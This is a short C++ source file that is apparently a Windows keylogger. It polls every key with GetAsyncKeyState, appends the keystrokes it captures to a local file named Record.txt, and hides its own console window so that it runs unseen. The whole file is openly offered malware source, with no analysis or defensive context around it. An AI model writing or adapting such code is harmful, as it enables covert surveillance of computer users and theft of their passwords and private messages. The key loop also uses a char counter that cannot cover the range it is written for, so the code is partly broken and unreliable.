#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>

using namespace std;

void log()
{
    char key;

    for (;;) {
        //sleep(0);
        for (key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                ofstream write ("Record.txt", ios::app);

                if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10))) {
                    key += 32;
                    write << key;
                    write.close();
                    break;
                } else if ((key > 64) && (key < 91)) {
                    write << key;
                    write.close();
                    break;
                } else {
                    switch (key) {
                        case 32: {
                            write << " ";
                        }
                        break;
                    }
                }
            }
        }
    }
}

void hide()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int main() 
{
    hide();
    log();
    return 0;
}

